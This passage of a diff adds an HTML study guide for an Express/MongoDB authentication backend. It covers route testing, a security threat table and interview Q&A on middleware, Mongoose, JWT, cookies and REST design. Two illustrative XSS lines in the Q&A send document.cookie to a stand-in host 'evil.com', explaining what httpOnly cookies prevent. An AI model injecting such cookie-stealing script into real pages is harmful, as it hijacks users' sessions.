+      <p>fullname, username, email, password (as text fields) + avatar (as File) + coverImage (as File, optional)</p>
+      <p class="route-expect">Expected: 201 + user object (no password, no refreshToken in response)</p>
+    </div>
+  </div>
+
+  <div class="route-card">
+    <div class="route-header"><span class="method-badge">POST</span><span class="route-url">{{base_url}}/users/login</span></div>
+    <div class="route-body">
+      <p><strong>Body:</strong> <code>JSON</code> — <code>{ "email": "tejas@test.com", "password": "Test@1234" }</code></p>
+      <p>Can use username instead of email: <code>{ "username": "tejas", "password": "..." }</code></p>
+      <p class="route-expect">Expected: 200 + accessToken + refreshToken in body + cookies set in cookie jar. Save the tokens.</p>
+    </div>
+  </div>
+
+  <div class="route-card">
+    <div class="route-header"><span class="method-badge">POST</span><span class="route-url">{{base_url}}/users/logout</span></div>
+    <div class="route-body">
+      <p><strong>Header:</strong> <code>Authorization: Bearer &lt;accessToken&gt;</code></p>
+      <p>OR if using Postman cookie jar, cookies are sent automatically</p>
+      <p class="route-expect">Expected: 200 + cookies cleared (check Cookie jar — they should be gone)</p>
+    </div>
+  </div>
+
+  <div class="route-card">
+    <div class="route-header"><span class="method-badge">POST</span><span class="route-url">{{base_url}}/users/refresh-token</span></div>
+    <div class="route-body">
+      <p><strong>Body:</strong> <code>JSON</code> — <code>{ "refreshToken": "&lt;your refresh token&gt;" }</code></p>
+      <p>OR it reads from cookie automatically if cookie jar has it</p>
+      <p class="route-expect">Expected: 200 + new accessToken + new refreshToken. Try the old refresh token again — should get 401.</p>
+    </div>
+  </div>
+
+  <h3>What to Verify in Each Response</h3>
+  <ul>
+    <li>Status code matches what the controller sends (201 for register, 200 for others)</li>
+    <li>Response shape always: <code>{ statusCode, message, data, success }</code></li>
+    <li>Cookies appear in Postman's Cookie Manager after login</li>
+    <li>Cookies are cleared after logout</li>
+    <li>After refresh, sending the old refresh token gives a 401</li>
+  </ul>
+</section>
+
+<!-- ═══ CHAPTER 12 ══════════════════════════════════════ -->
+<section class="chapter" id="ch12">
+  <div class="ch-eyebrow">// CH.12</div>
+  <h2>Security Deep Dive</h2>
+  <p class="chapter-desc">Every threat, the protection used, and exactly where in the code it lives.</p>
+
+  <div class="table-wrap"><table class="sec-table">
+    <tr><th>Threat</th><th>Protection Used</th><th>Location in Code</th></tr>
+    <tr><td>Password theft from DB breach</td><td>bcrypt hash with 10 salt rounds — original password never stored</td><td>user.model.js pre-save hook</td></tr>
+    <tr><td>Token forgery / tampering</td><td>JWT HMAC signature with server secret — invalid if modified</td><td>jwt.sign + jwt.verify</td></tr>
+    <tr><td>XSS cookie theft</td><td><code>httpOnly: true</code> — JS on page cannot read cookie</td><td>loginUser options object</td></tr>
+    <tr><td>HTTP man-in-the-middle</td><td><code>secure: true</code> — cookie only sent over HTTPS</td><td>loginUser options object</td></tr>
+    <tr><td>Stolen refresh token replay</td><td>DB comparison — token must match stored value; logout deletes stored value</td><td>refreshAccessToken controller</td></tr>
+    <tr><td>Credential exposure in code</td><td>All secrets in .env — never hardcoded, .env in .gitignore</td><td>Project root</td></tr>
+    <tr><td>Oversized request payloads</td><td><code>express.json({ limit: "16kb" })</code></td><td>app.js</td></tr>
+    <tr><td>Large file abuse</td><td>Multer 50MB limit</td><td>multer.middlewares.js</td></tr>
+    <tr><td>Cross-origin requests</td><td>cors with explicit CORS_ORIGIN from env</td><td>app.js</td></tr>
+    <tr><td>Sensitive data in API response</td><td>.select("-password -refreshToken") on all user queries</td><td>All controllers returning user</td></tr>
+  </table></div>
+
+  <div class="callout interview">
+    <div class="callout-label">Interview Q</div>
+    <p>"What is bcrypt? What is a salt?" — bcrypt is a password hashing algorithm designed to be slow (computationally expensive) to make brute-force attacks infeasible. A salt is a random string added to the password before hashing — ensures two users with the same password get different hashes, defeating rainbow table attacks.</p>
+    <p>"What is CORS and why does it exist?" — Cross-Origin Resource Sharing. Browsers block requests from one domain to another by default (same-origin policy). CORS headers tell the browser which origins are allowed to make cross-origin requests. It exists to protect users from malicious sites making requests on their behalf to other sites.</p>
+  </div>
+</section>
+
+<!-- ═══ CHAPTER 13 ══════════════════════════════════════ -->
+<section class="chapter" id="ch13">
+  <div class="ch-eyebrow">// CH.13</div>
+  <h2>Interview Master List</h2>
+  <p class="chapter-desc">Every question answered with a short explanation + a practical example. Read the Q, say the answer out loud, then check.</p>
+
+  <!-- ── Group 1: Express / Node.js ── -->
+  <div class="qa-group">
+    <div class="qa-group-title">Express / Node.js</div>
+
+    <div class="qa-item">
+      <div class="qa-q">What is middleware? Explain the middleware chain with an example.</div>
+      <div class="qa-body">
+        <div class="qa-a">A function with <code>(req, res, next)</code> that runs between the incoming request and the route handler. Each middleware either calls <code>next()</code> to pass control forward, or ends the request with <code>res.json()</code>.</div>
+        <div class="qa-eg"><span class="hi">// express.json() is literally this under the hood:</span>
+(req, res, next) => {
+  req.body = JSON.parse(rawBodyBuffer)   <span class="ok">// modify req</span>
+  next()                                 <span class="ok">// pass forward</span>
+}
+<span class="hi">// If you remove it:</span>
+req.body → <span class="bad">undefined</span>   (every controller that reads body breaks)</div>
+      </div>
+    </div>
+
+    <div class="qa-item">
+      <div class="qa-q">What is the difference between app.use() and router.use()?</div>
+      <div class="qa-body">
+        <div class="qa-a"><code>app.use()</code> registers middleware on the entire application — every route gets it. <code>router.use()</code> applies only to routes registered on that specific router instance.</div>
+        <div class="qa-eg">app.use(cors())               <span class="ok">// CORS for ALL routes</span>
+app.use("/api/v1/users", userRouter)
+
+<span class="hi">// Inside userRouter only:</span>
+router.use(verifyJWT)        <span class="ok">// auth guard only for /api/v1/users/* routes</span></div>
+      </div>
+    </div>
+
+    <div class="qa-item">
+      <div class="qa-q">What happens when you call next(error) vs next()?</div>
+      <div class="qa-body">
+        <div class="qa-a"><code>next()</code> passes control to the next middleware in the chain. <code>next(error)</code> skips all remaining normal middleware and jumps directly to Express's 4-argument error handler.</div>
+        <div class="qa-eg"><span class="hi">// asyncHandler does this automatically:</span>
+Promise.resolve(fn(req, res, next)).catch(next)
+<span class="ok">// any throw inside the controller → next(error) → error handler sends response</span>
+
+<span class="hi">// Your error handler looks like:</span>
+app.use((err, req, res, next) => {          <span class="ok">// 4 args = error handler</span>
+  res.status(err.code || 500).json({ message: err.message })
+})</div>
+      </div>
+    </div>
+
+    <div class="qa-item">
+      <div class="qa-q">What does express.json() do? What happens without it?</div>
+      <div class="qa-body">
+        <div class="qa-a">Reads the raw request body buffer, parses it as JSON, and sets <code>req.body</code>. Without it, <code>req.body</code> is <code>undefined</code> — any controller reading body fields silently fails.</div>
+        <div class="qa-eg">POST /login  body: {"email":"t@t.com","password":"1234"}
+
+<span class="bad">// Without express.json():</span>
+req.body → undefined
+req.body.email → TypeError: Cannot read property of undefined
+
+<span class="ok">// With express.json():</span>
+req.body.email → "t@t.com"  ✓</div>
+      </div>
+    </div>
+
+    <div class="qa-item">
+      <div class="qa-q">What is express.urlencoded() and when is it needed?</div>
+      <div class="qa-body">
+        <div class="qa-a">Parses HTML form data (Content-Type: application/x-www-form-urlencoded). Needed when an HTML <code>&lt;form&gt;</code> submits data — not JSON, but key=value pairs.</div>
+        <div class="qa-eg"><span class="hi">// HTML form submits:</span>
+Content-Type: application/x-www-form-urlencoded
+Body: name=tejas&email=t%40t.com
+
+<span class="ok">// With urlencoded({ extended: true }):</span>
+req.body.name  → "tejas"
+req.body.email → "t@t.com"
+<span class="hi">// extended:true allows nested objects: user[name]=tejas</span></div>
+      </div>
+    </div>
+
+    <div class="qa-item">
+      <div class="qa-q">What is cookie-parser and why is it needed separately?</div>
+      <div class="qa-body">
+        <div class="qa-a">Express does not parse cookies by default. <code>cookie-parser</code> reads the <code>Cookie</code> request header, parses it, and populates <code>req.cookies</code> as an object.</div>
+        <div class="qa-eg"><span class="bad">// Without cookie-parser:</span>
+req.cookies → undefined
+req.cookies.accessToken → TypeError ✗
+
+<span class="ok">// With app.use(cookieParser()):</span>
+req.cookies.accessToken → "eyJhbGci..."  ✓
+<span class="hi">// verifyJWT reads this to authenticate browser clients</span></div>
+      </div>
+    </div>
+
+    <div class="qa-item">
+      <div class="qa-q">What does process.exit(1) mean? When do you use it?</div>
+      <div class="qa-body">
+        <div class="qa-a">Terminates the Node process immediately. Exit code <strong>1</strong> = error. Exit code <strong>0</strong> = clean shutdown. Process managers (PM2, Docker) watch exit codes to decide whether to restart.</div>
+        <div class="qa-eg">connectDB()
+  .then(() => app.listen(PORT))
+  .catch((err) => {
+    console.error("DB connection failed:", err)
+    process.exit(1)    <span class="hi">// PM2 sees code 1 → restarts service</span>
+  })
+<span class="ok">// If you just throw, Node may stay running in a broken state</span></div>
+      </div>
+    </div>
+
+    <div class="qa-item">
+      <div class="qa-q">What is the difference between CommonJS (require) and ES Modules (import)?</div>
+      <div class="qa-body">
+        <div class="qa-a">CommonJS: <code>require()</code> is synchronous, runs at runtime. ES Modules: <code>import</code> is static, parsed before execution, supports tree-shaking. Set <code>"type":"module"</code> in package.json to use ESM.</div>
+        <div class="qa-eg"><span class="bad">// CommonJS (old):</span>
+const express = require('express')
+module.exports = { app }
+
+<span class="ok">// ES Modules (this project):</span>
+import express from 'express'
+export { app }
+
+<span class="hi">// ESM also enables top-level await — useful for DB connections</span></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── Group 2: MongoDB / Mongoose ── -->
+  <div class="qa-group">
+    <div class="qa-group-title">MongoDB / Mongoose</div>
+
+    <div class="qa-item">
+      <div class="qa-q">What is the difference between SQL and NoSQL? When would you choose MongoDB?</div>
+      <div class="qa-body">
+        <div class="qa-a">SQL: structured tables, strict schema, joins. NoSQL (MongoDB): JSON documents, flexible schema, references instead of joins. Choose MongoDB when data structure varies per document, you need horizontal scaling, or you're already working with JSON.</div>
+        <div class="qa-eg"><span class="hi">// SQL:</span>  users table + videos table + JOIN on user_id
+<span class="hi">// MongoDB:</span> video document embeds owner: ObjectId("userId")
+<span class="ok">//           .populate("owner") fetches the user at app level</span>
+
+<span class="hi">// Choose MongoDB when:</span>
+<span class="ok">// - User profiles have optional/varying fields</span>
+<span class="ok">// - Storing JSON-heavy data (like config, logs)</span>
+<span class="bad">// - NOT ideal for: complex multi-table transactions, strict ACID</span></div>
+      </div>
+    </div>
+
+    <div class="qa-item">
+      <div class="qa-q">What is a Mongoose schema? What does it add over raw MongoDB?</div>
+      <div class="qa-body">
+        <div class="qa-a">MongoDB accepts any JSON with zero enforcement. A Mongoose schema adds type validation, required fields, unique constraints, default values, indexes, and custom methods — all at the application layer.</div>
+        <div class="qa-eg"><span class="bad">// Raw MongoDB — no schema, this works:</span>
+db.users.insertOne({ anything: true, noEmail: true })
+
+<span class="ok">// Mongoose schema — this throws:</span>
+await User.create({ anything: true })
+<span class="hi">// → ValidationError: email is required</span></div>
+      </div>
+    </div>
+
+    <div class="qa-item">
+      <div class="qa-q">What is a pre-save hook? What is the isModified() check for?</div>
+      <div class="qa-body">
+        <div class="qa-a">A function that runs before every <code>.save()</code>. <code>isModified("password")</code> returns true only if the password field changed in this operation — critical to prevent re-hashing an already-hashed value.</div>
+        <div class="qa-eg"><span class="bad">// Without isModified check:</span>
+user.username = "newname"
+await user.save()
+<span class="bad">// → pre-save hashes the already-hashed password AGAIN</span>
+<span class="bad">// → bcrypt.compare("rawPassword", hashOfHash) → false → login broken forever</span>
+
+<span class="ok">// With isModified:</span>
+if (!this.isModified("password")) return   <span class="ok">// ← skip hashing on username update</span></div>
+      </div>
+    </div>
+
+    <div class="qa-item">
+      <div class="qa-q">What is populate() in Mongoose? How is it different from a SQL JOIN?</div>
+      <div class="qa-body">
+        <div class="qa-a">Replaces an ObjectId reference field with the actual document from the referenced collection. Unlike SQL JOINs (done in DB), populate makes separate DB queries — one to get the parent, another to get the referenced documents.</div>
+        <div class="qa-eg"><span class="hi">// watchHistory: [ObjectId("vid1"), ObjectId("vid2")]</span>
+
+<span class="ok">// Without populate:</span>
+user.watchHistory → ["64abc...", "64def..."]   (just IDs)
+
+<span class="ok">// With populate:</span>
+await User.findById(id).populate("watchHistory")
+user.watchHistory → [{ title: "Video 1", url: "..." }, ...]
+
+<span class="hi">// SQL JOIN = 1 query. Mongoose populate = 2 queries (N+1 problem)</span></div>
+      </div>
+    </div>
+
+    <div class="qa-item">
+      <div class="qa-q">What is mongoose-aggregate-paginate? When is aggregation needed?</div>
+      <div class="qa-body">
+        <div class="qa-a">Plugin that adds <code>.aggregatePaginate()</code> for paginated aggregation pipeline queries. Use aggregation when you need to filter + sort + group + join in one DB operation (like a YouTube feed).</div>
+        <div class="qa-eg"><span class="bad">// Without pagination — loads ALL videos:</span>
+const videos = await Video.find()   <span class="bad">// 50,000 videos → memory crash</span>
+
+<span class="ok">// With aggregatePaginate:</span>
+Video.aggregatePaginate(pipeline, { page: 1, limit: 20 })
+<span class="ok">// → Returns 20 videos + totalDocs + totalPages + hasNextPage</span></div>
+      </div>
+    </div>
+
+    <div class="qa-item">
+      <div class="qa-q">What is the difference between instance methods and static methods in Mongoose?</div>
+      <div class="qa-body">
+        <div class="qa-a"><strong>Instance methods</strong> are called on a document — they access <code>this</code> (the current document). <strong>Static methods</strong> are called on the Model itself, not on a document.</div>
+        <div class="qa-eg"><span class="hi">// Instance method — called on a user object:</span>
+userSchema.methods.isPasswordCorrect = function(pw) {
+  return bcrypt.compare(pw, this.password)   <span class="ok">// needs 'this'</span>
+}
+const user = await User.findById(id)
+await user.isPasswordCorrect("mypassword")  <span class="ok">// ← on instance</span>
+
+<span class="hi">// Static method — called on the Model:</span>
+userSchema.statics.findByEmail = function(email) {
+  return this.findOne({ email })
+}
+await User.findByEmail("t@t.com")            <span class="ok">// ← on Model</span></div>
+      </div>
+    </div>
+
+    <div class="qa-item">
+      <div class="qa-q">What does index: true do on a schema field?</div>
+      <div class="qa-body">
+        <div class="qa-a">Creates a B-tree index in MongoDB on that field. Indexes make queries on that field dramatically faster — instead of scanning every document, MongoDB goes directly to the result.</div>
+        <div class="qa-eg"><span class="bad">// Without index on username (1 million users):</span>
+User.findOne({ username: "tejas" })
+<span class="bad">// → Full collection scan: checks all 1,000,000 documents</span>
+
+<span class="ok">// With index: true:</span>
+<span class="ok">// → B-tree lookup: finds "tejas" in ~log(n) steps ≈ instant</span>
+
+<span class="hi">// Tradeoff: indexes speed up reads but slow down writes slightly
+// (index must be updated on every insert/update)</span></div>
+      </div>
+    </div>
+
+    <div class="qa-item">
+      <div class="qa-q">What is { validateBeforeSave: false } and when should you use it?</div>
+      <div class="qa-body">
+        <div class="qa-a">Skips Mongoose schema validation for that specific save. Use ONLY for internal field updates (like saving refreshToken) — never for user-submitted data, since that's where validation matters most.</div>
+        <div class="qa-eg"><span class="bad">// Without validateBeforeSave: false:</span>
+user.refreshToken = newToken
+await user.save()
+<span class="bad">// → ValidationError: avatar is required, fullname is required...</span>
+<span class="bad">// (re-validates ALL required fields even though we only touched refreshToken)</span>
+
+<span class="ok">// With it:</span>
+await user.save({ validateBeforeSave: false })   <span class="ok">// skips validation ✓</span></div>
+      </div>
+    </div>
+
+    <div class="qa-item">
+      <div class="qa-q">What does $unset do? How is it different from setting null?</div>
+      <div class="qa-body">
+        <div class="qa-a"><code>$unset</code> removes the field from the document entirely. <code>$set: { field: null }</code> keeps the field but sets its value to null — the field still exists in the document.</div>
+        <div class="qa-eg"><span class="hi">// After $set: { refreshToken: null }:</span>
+{ username: "tejas", refreshToken: null }   <span class="bad">// field exists, value is null</span>
+
+<span class="ok">// After $unset: { refreshToken: 1 }:</span>
+{ username: "tejas" }                       <span class="ok">// field gone entirely</span>
+
+<span class="hi">// This project uses $unset on logout — cleaner, confirms logged-out state</span></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── Group 3: Authentication & JWT ── -->
+  <div class="qa-group">
+    <div class="qa-group-title">Authentication &amp; JWT</div>
+
+    <div class="qa-item">
+      <div class="qa-q">What is JWT? What are its 3 parts?</div>
+      <div class="qa-body">
+        <div class="qa-a">JSON Web Token — a signed string for stateless authentication. Three parts separated by dots: <strong>header.payload.signature</strong>. The payload is visible (base64) but tamper-proof (HMAC signature).</div>
+        <div class="qa-eg">eyJhbGciOiJIUzI1NiJ9  .  eyJfaWQiOiIxMjMifQ  .  abc123sig
+        ↑ header (base64)          ↑ payload (base64)     ↑ signature (HMAC)
+
+decode header  → { "alg": "HS256" }
+decode payload → { "_id": "123", "email": "t@t.com", "exp": 1735000000 }
+<span class="hi">// Payload is NOT encrypted — don't put passwords here
+// Signature = HMAC(header + "." + payload, secret) — tamper-proof</span></div>
+      </div>
+    </div>
+
+    <div class="qa-item">
+      <div class="qa-q">What is the difference between an access token and a refresh token?</div>
+      <div class="qa-body">
+        <div class="qa-a">Access token: short-lived (1d), sent with every API request, contains user info, NOT stored in DB. Refresh token: long-lived (10d), stored in DB, used ONLY to get new access tokens when they expire.</div>
+        <div class="qa-eg"><span class="hi">// Access token expires (after 1 day):</span>
+GET /api/v1/users/profile
+Authorization: Bearer expired_token
+→ jwt.verify throws → 401 Unauthorized
+
+<span class="ok">// Client uses refresh token to get new access token:</span>
+POST /api/v1/users/refresh-token
+body: { refreshToken: "long_lived_token" }
+→ returns new accessToken + new refreshToken  ✓</div>
+      </div>
+    </div>
+
+    <div class="qa-item">
+      <div class="qa-q">Why store the refresh token in the database?</div>
+      <div class="qa-body">
+        <div class="qa-a">JWT is stateless — once issued, it's valid until expiry regardless of what happens. Storing in DB lets you "revoke" it: on logout, delete it from DB. Even a valid JWT signature fails if it doesn't match the DB copy.</div>
+        <div class="qa-eg"><span class="hi">// Scenario: user logs out, attacker has old refresh token</span>
+
+logout()  → $unset refreshToken from DB
+
+<span class="hi">// Attacker tries refresh with old token:</span>
+incomingToken = "old_valid_jwt"
+user.refreshToken = undefined   <span class="bad">// was $unset on logout</span>
+"old_valid_jwt" !== undefined   → <span class="ok">401 rejected  ✓</span>
+<span class="hi">// Without DB storage: valid signature = always accepted = logout is meaningless</span></div>
+      </div>
+    </div>
+
+    <div class="qa-item">
+      <div class="qa-q">What is refresh token rotation? Why is it more secure?</div>
+      <div class="qa-body">
+        <div class="qa-a">Every time you use a refresh token, you get a NEW refresh token and the old one is immediately invalidated. If an attacker steals a refresh token, it becomes useless after the legitimate user next refreshes.</div>
+        <div class="qa-eg">T=0: attacker steals refresh_token_A
+T=1: legitimate user calls /refresh-token with token_A
+     → server issues: access_token_NEW + refresh_token_B
+     → refresh_token_A deleted from DB
+T=2: attacker tries refresh_token_A
+     → <span class="ok">token_A !== user.refreshToken (token_B) → 401  ✓</span>
+
+<span class="hi">// Without rotation: one stolen token = permanent access until expiry</span></div>
+      </div>
+    </div>
+
+    <div class="qa-item">
+      <div class="qa-q">What is the difference between httpOnly and secure cookie flags?</div>
+      <div class="qa-body">
+        <div class="qa-a"><code>httpOnly</code> prevents JavaScript on the page from reading the cookie (blocks XSS). <code>secure</code> prevents the cookie from being sent over HTTP — only HTTPS (blocks network interception).</div>
+        <div class="qa-eg"><span class="hi">// XSS attack injects script into your page:</span>
+document.location = "evil.com?stolen=" + document.cookie
+
+<span class="ok">// With httpOnly: true:</span>
+document.cookie   → <span class="ok">""  (accessToken not visible)</span>  ✓
+
+<span class="hi">// HTTP connection (no HTTPS) with secure: true:</span>
+Browser silently does NOT send the cookie  ✓
+<span class="hi">// Attacker sniffing HTTP traffic gets nothing</span></div>
+      </div>
+    </div>
+
+    <div class="qa-item">
+      <div class="qa-q">What is the difference between authentication and authorization?</div>
+      <div class="qa-body">
+        <div class="qa-a"><strong>Authentication</strong>: proving WHO you are (login, JWT verify). <strong>Authorization</strong>: proving you're ALLOWED to do something (roles, permissions). You must authenticate first, then authorize.</div>
+        <div class="qa-eg"><span class="hi">// Authentication — verifyJWT in this project:</span>
+jwt.verify(token, secret) → confirms you are who you claim
+req.user = foundUser       → identity established
+
+<span class="hi">// Authorization — (not yet in project, but would look like):</span>
+if (req.user.role !== "admin")
+  throw new ApiError(403, "Forbidden")  <span class="ok">// 403 = authenticated but not allowed</span>
+
+<span class="hi">// 401 = not authenticated  |  403 = authenticated, not authorized</span></div>
+      </div>
+    </div>
+
+    <div class="qa-item">
+      <div class="qa-q">Why send tokens in both cookie AND JSON response body?</div>
+      <div class="qa-body">
+        <div class="qa-a">Browser clients use cookies (auto-sent, httpOnly). Mobile apps and API clients (Postman) can't use httpOnly cookies easily — they read from response body and set <code>Authorization</code> header manually. One API needs to serve both.</div>
+        <div class="qa-eg"><span class="hi">// Browser (auto-cookie):</span>
+res.cookie("accessToken", token, { httpOnly: true })
+<span class="ok">// Browser attaches cookie to every subsequent request automatically</span>
+
+<span class="hi">// Mobile app / Postman (reads body):</span>
+res.json({ accessToken: token })
+<span class="ok">// Client stores it, sends: Authorization: Bearer &lt;token&gt;</span>
+
+<span class="hi">// verifyJWT handles both sources:</span>
+req.cookies?.accessToken || req.header("Authorization")?.replace("Bearer ","")</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── Group 4: Security ── -->
+  <div class="qa-group">
+    <div class="qa-group-title">Security</div>
+
+    <div class="qa-item">
+      <div class="qa-q">What is XSS and how does httpOnly protect against it?</div>
+      <div class="qa-body">
+        <div class="qa-a">XSS (Cross-Site Scripting): attacker injects malicious JavaScript into your page via user input fields, comments, or CDN compromise. That script can steal cookies, redirect users, or make requests on their behalf.</div>
+        <div class="qa-eg"><span class="bad">// Attacker posts this as a comment:</span>
+&lt;script&gt;fetch("evil.com?c=" + document.cookie)&lt;/script&gt;
+
+<span class="bad">// Without httpOnly: accessToken appears in document.cookie → STOLEN</span>
+
+<span class="ok">// With httpOnly: true:</span>
+document.cookie = ""   (token invisible to all JS)
+<span class="ok">// Attacker's script gets nothing  ✓</span>
+<span class="hi">// httpOnly does NOT protect against CSRF — that needs other measures</span></div>
+      </div>
+    </div>
+
+    <div class="qa-item">
+      <div class="qa-q">What is bcrypt? What is a salt? What are salt rounds?</div>
+      <div class="qa-body">
+        <div class="qa-a">bcrypt is a deliberately slow hashing algorithm — its slowness is the security feature. A salt is a unique random string added to the password before hashing. Salt rounds (10) = 2^10 = 1024 internal iterations.</div>
+        <div class="qa-eg"><span class="hi">// Same password, different salts → completely different hashes:</span>
+bcrypt.hash("password123", 10) → "$2b$10$abc...xyz"
+bcrypt.hash("password123", 10) → "$2b$10$def...uvw"   <span class="ok">// different!</span>
+
+<span class="hi">// Salt is embedded in the hash string — compare() extracts it:</span>
+bcrypt.compare("password123", storedHash)
+<span class="ok">// → extracts salt from hash → re-hashes → compares → true/false</span>
+
+<span class="hi">// Salt rounds tradeoff: 10 ≈ 100ms (fine). 14 ≈ 1.5s (too slow for login)</span></div>
+      </div>
+    </div>
+
+    <div class="qa-item">
+      <div class="qa-q">What is a rainbow table attack? How does salting prevent it?</div>
+      <div class="qa-body">
+        <div class="qa-a">A rainbow table is a pre-computed lookup: {password → hash}. Without salting, <code>hash("password123")</code> is always the same — attacker looks it up instantly. Salting makes every hash unique, making the table useless.</div>
+        <div class="qa-eg"><span class="bad">// Without salt — MD5("password123") is always the same:</span>
+rainbow_table["482c811da5d5b4bc6d497ffa98491e38"] → "password123"
+<span class="bad">// Attacker queries table → instant crack</span>
+
+<span class="ok">// With bcrypt salt:</span>
+user_A: bcrypt("password123" + saltA) → "hash_A"
+user_B: bcrypt("password123" + saltB) → "hash_B"   (same password, different hash)
+<span class="ok">// Rainbow table is useless — would need a unique table per user</span></div>
+      </div>
+    </div>
+
+    <div class="qa-item">
+      <div class="qa-q">Why should secrets never be hardcoded in source code?</div>
+      <div class="qa-body">
+        <div class="qa-a">Git history is permanent. Even if you delete the secret in the next commit, it exists in every previous commit. Anyone with repo access (or who ever cloned it) has your DB credentials, JWT secrets, and API keys forever.</div>
+        <div class="qa-eg"><span class="bad">// Hardcoded — visible in every git commit forever:</span>
+jwt.sign(payload, "chai-aur-code")    ✗
+
+<span class="ok">// Environment variable — not in code:</span>
+jwt.sign(payload, process.env.ACCESS_TOKEN_SECRET)   ✓
+
+<span class="hi">// Even if accidentally pushed:</span>
+<span class="hi">// 1. Rotate the secret immediately (generate new one)</span>
+<span class="hi">// 2. All existing JWTs signed with old secret → invalid → users re-login</span>
+<span class="hi">// 3. git filter-branch to scrub history (painful)</span></div>
+      </div>
+    </div>
+
+    <div class="qa-item">
+      <div class="qa-q">What is CORS? Why does the browser enforce it? How do you configure it?</div>
+      <div class="qa-body">
+        <div class="qa-a">CORS (Cross-Origin Resource Sharing): browsers block requests from one origin to another by default (same-origin policy). The server sends CORS headers to tell the browser which origins are allowed.</div>
+        <div class="qa-eg"><span class="bad">// Frontend on http://localhost:3000 calls API on http://localhost:8000:</span>
+<span class="bad">// Browser blocks: "CORS policy: No 'Access-Control-Allow-Origin' header"</span>
+
+<span class="ok">// In app.js:</span>
+app.use(cors({
+  origin: process.env.CORS_ORIGIN,   <span class="ok">// "http://localhost:3000"</span>
+  credentials: true                  <span class="ok">// allow cookies to be sent cross-origin</span>
+}))
+<span class="hi">// Note: origin: "*" works but disables credentials (cookies won't be sent)</span></div>
+      </div>
+    </div>
+
+    <div class="qa-item">
+      <div class="qa-q">What is a man-in-the-middle attack? How does secure: true help?</div>
+      <div class="qa-body">
+        <div class="qa-a">MITM: attacker sits between client and server on the same network (e.g., coffee shop WiFi) and reads unencrypted HTTP traffic. <code>secure: true</code> on cookies ensures they're only sent over HTTPS — HTTPS is encrypted, so the attacker reads nothing.</div>
+        <div class="qa-eg"><span class="bad">// HTTP (unencrypted) — attacker on same WiFi sees:</span>
+Cookie: accessToken=eyJhbGci...   <span class="bad">← plaintext, stolen instantly</span>
+
+<span class="ok">// With secure: true + HTTPS:</span>
+Cookie only sent over HTTPS  →  traffic is TLS-encrypted
+<span class="ok">// Attacker sees gibberish: Ωα9#∆£∑... ✓</span>
+<span class="hi">// Note: secure:true has no effect on localhost (use it in production only)</span></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── Group 5: API & Architecture ── -->
+  <div class="qa-group">
+    <div class="qa-group-title">API &amp; Architecture Design</div>
+
+    <div class="qa-item">
+      <div class="qa-q">What is REST? What makes an API RESTful?</div>
+      <div class="qa-body">
+        <div class="qa-a">Architectural style with 5 rules: stateless, resource-based URLs, standard HTTP verbs, uniform interface, and responses indicate state. An API is RESTful when it follows these constraints consistently.</div>
+        <div class="qa-eg"><span class="bad">// NOT RESTful (verb in URL, wrong method):</span>
+POST /getUser        ✗
+GET  /deleteUser/1   ✗
+
+<span class="ok">// RESTful:</span>
+GET    /users        ← list all
+POST   /users        ← create
+GET    /users/:id    ← get one
+PATCH  /users/:id    ← update
+DELETE /users/:id    ← delete
+
+<span class="hi">// Stateless: server has no memory of previous requests
+// Every request carries everything needed (JWT, body, params)</span></div>
+      </div>
+    </div>
+
+    <div class="qa-item">
+      <div class="qa-q">What is separation of concerns? Show me in this project.</div>
+      <div class="qa-body">
+        <div class="qa-a">Each module has ONE job and doesn't know about others' internals. If you need to change the ORM from Mongoose to Prisma, only the models change. Routes don't care about DB queries. Utils don't import Express.</div>
+        <div class="qa-eg"><span class="hi">// Route: only knows URL → handler mapping</span>
+router.route("/logout").post(verifyJWT, logoutUser)
+
+<span class="hi">// Middleware: only does JWT verification</span>
+req.user = user; next()
+
+<span class="hi">// Controller: only runs business logic</span>
+$unset refreshToken, clearCookie, res.json(...)
+
+<span class="hi">// Model: only knows data structure + data methods</span>
+getRefreshToken() { return jwt.sign({_id}, secret) }
+
+<span class="ok">// None of these import or know about the others' implementation  ✓</span></div>
+      </div>
+    </div>
+
+    <div class="qa-item">
+      <div class="qa-q">What is the MVC pattern? How does this project implement it?</div>
+      <div class="qa-body">
+        <div class="qa-a">Model-View-Controller: Model handles data, View displays it, Controller handles user intent. In REST APIs, the "View" is the JSON response (no HTML templates needed).</div>
+        <div class="qa-eg"><span class="hi">// Model (M) → src/models/user.model.js</span>
+Schema + bcrypt hook + getAccessToken() + getRefreshToken()
+
+<span class="hi">// Controller (C) → src/controllers/user.controller.js</span>
+registerUser, loginUser, logoutUser — business logic
+
+<span class="hi">// View (V) → the JSON response itself</span>
+res.json(new ApiResponse(200, "Logged in", { user, accessToken }))
+
+<span class="ok">// Routes wire C to URLs. Middlewares protect C from unauthorized access.</span></div>
+      </div>
+    </div>
+
+    <div class="qa-item">
+      <div class="qa-q">What is a custom error class and why use one over res.status().json() everywhere?</div>
+      <div class="qa-body">
+        <div class="qa-a"><code>throw new ApiError(401, "Unauthorized")</code> works from anywhere in the call stack — model methods, utils, deeply nested functions. <code>res.json()</code> only works inside route handlers that have access to <code>res</code>.</div>
+        <div class="qa-eg"><span class="bad">// Problem with res.json() everywhere:</span>
+const uploadAvatar = async (path) => {
+  if (!path) res.status(400).json(...)   <span class="bad">// no 'res' here! ✗</span>
+}
+
+<span class="ok">// With custom error class:</span>
+const uploadAvatar = async (path) => {
+  if (!path) throw new ApiError(400, "Avatar required")  <span class="ok">// works anywhere ✓</span>
+}
+<span class="ok">// asyncHandler catches it → next(error) → error handler sends response</span></div>
+      </div>
+    </div>
+
+    <div class="qa-item">
+      <div class="qa-q">What is an API response envelope? Why is consistency important?</div>
+      <div class="qa-body">
+        <div class="qa-a">Wrapping every response in a standard shape: <code>{ statusCode, message, data, success }</code>. Without it, every endpoint returns different shapes — frontend code becomes a mess of if-elses to handle each one.</div>
+        <div class="qa-eg"><span class="bad">// Without envelope — 3 endpoints, 3 shapes:</span>
+POST /login    → { user, token }
+GET  /profile  → { username, email, avatar }
+GET  /videos   → [{ title, url }]
+<span class="bad">// Frontend: if(res.user)... if(res.username)... if(Array.isArray(res))...</span>
+
+<span class="ok">// With ApiResponse envelope — always the same:</span>
+{ statusCode: 200, message: "...", data: { ...anything }, success: true }
+<span class="ok">// Frontend always reads: response.data — one pattern, zero guessing  ✓</span></div>
+      </div>
+    </div>
+
